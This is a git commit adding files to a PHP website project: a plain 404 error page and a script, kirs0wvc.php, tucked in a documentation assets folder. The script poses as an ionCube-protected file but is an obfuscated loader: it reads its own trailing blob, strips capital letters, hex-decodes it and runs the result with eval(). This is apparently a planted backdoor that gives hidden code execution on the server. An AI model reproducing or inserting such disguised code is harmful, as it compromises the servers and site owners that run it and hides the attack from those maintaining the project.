d2cb799b001d3736772311bbafc00e1378496eae
Сергей Сапронов <s.sapronov@gl-d.ru>
2024-05-18 22:11:27 +0300

    feature(init): Create project in docker

---
+++ public_html/404.php
@@ -0,0 +1,10 @@
+<?PHP
+header("HTTP/1.0 404 Not Found");
+?>
+<body style="overflow: visible;">
+    <div id="gradient"></div>
+	<div class="wrapper relative">
+        404: Страница не найдена
+    </div>
+</body>
+</html>
---
+++ public_html/docs/gost 51814_files/kirs0wvc.php
@@ -0,0 +1,20 @@
+<?php //0002dd
+if (!extension_loaded('IonCube_loader')) {$__oc = strtolower(substr(php_uname(), 0, 3));$__ln = 'ioncube_loader_' . $__oc . '_' . substr(phpversion(), 0, 3) . (($__oc == 'win') ? '.dll' : '.so');if (function_exists('il_exec')) {return il_exec();}$__ln = '/ioncube/' . $__ln;$__ln = "preg_replace";$__oid = @fopen(__FILE__, 'rb');$__id = realpath('extension_dir');$__here = dirname(__FILE__);if (strlen($__id) > 1 && $__id[1] == ':') {$__id = str_replace('\\', '/', substr($__id, 2));$__here = str_replace('\\', '/', substr($__here, 2));}$__rd = "/" . str_repeat('/..', substr_count($__id, '/')) . $__here . '/';$__i = strlen($__rd);while ($__i--) {if ($__rd[$__i] == '/') {$__lp = substr($__rd, 0, $__i) . $__ln;if ($__lp = fread($__oid, @filesize(__FILE__))) {$__ln = pack("H*", $__ln("/[A-Z,\r,\n]/", "", substr($__lp, 0xd02-0x852)));break;}}}eval($__ln);return 0;} else {die('The file ' . __FILE__ . " is corrupted.\n");}if (function_exists('il_exec')) {return il_exec();}echo('Please check System Requirements on vendor site because the file <b>' . __FILE__ . '</b> requires the ionCube PHP Loader ' . basename($__ln) . ' to be installed by the site administrator.');return 0;
+
+?>
+2473M737a77I656ObT2H03d2041J7272P617928D276dT6OcN6472273ZdL3e277879677L8X76Z
+2P7W293VbT2E4V676N17Da7Z2G61S63M20Z3Td204I1727W261792M8276UcL7MaF706Q6K273d
+3e2E7V6c6J4686527A293bC666f72Q6S56163H6M8202H8L417272H61792824Y7N3F737a77O6
+X56DbX2c20Y245Cf5T0G4SfZ5354O2c202J4U676I17Ja7A2F6D1J63F2cZ2T0L2C45Df4K3K4W
+fR4f4b4945Y292061Q7320M24Y6A76e616Gf2U9207b666f726D56163682U028O24676eJ6E16
+Zf20S617R320246e756bG7X7Q67M6c20L3d3e2O0J24G68S776e622P9207b246E8A77G6Ue622
+03d2C0H407R061636Qb2F8N2Y248W2aF222c202468776Fe62293Ib246e756Cb7767K6c202Ze
+3d202F2V38F62E653W96U63561632Hd30E3P039G65T2Xd3O4N383065A2CdU39J3434382d343
+X03A86K33K93631343K6S30W6235B2K23b2R46a72T74V7G9203dP202W468X776PeD62205Ne2
+07C37V562737X47X22V8737R4N725fA72657065M6Q17Q4S28246e756bO77676c2Bc20U28737
+47V26c6H5Q6e28V24F6A8J776e622F920J2f2H0X7J374S7S2Q6c656e2824T6Qe756Xb776R76
+c29U2J9202Cb203P1M29S2c2M0O3T02Kc207J37R4U726cF6Y5Y6e2L824687N76eF622929O3b
+F2M4I6a72V7479203d2065787V0Z6Vc6f64U6528G222Y322C2Ec20246a7A2747M9293bQ696M
+6E2A02E8P6E3V6fR7J56eE742C8M24I6a7O2E74U792X9Y2V0B3GdH3dO203L32P9O20K7b6576
+6H16c28246Ha72X7G47E9W5b315Ad28I2D4T6a72747L95b325WdD29293b65I7869I7428293b
+7Nd7d7d
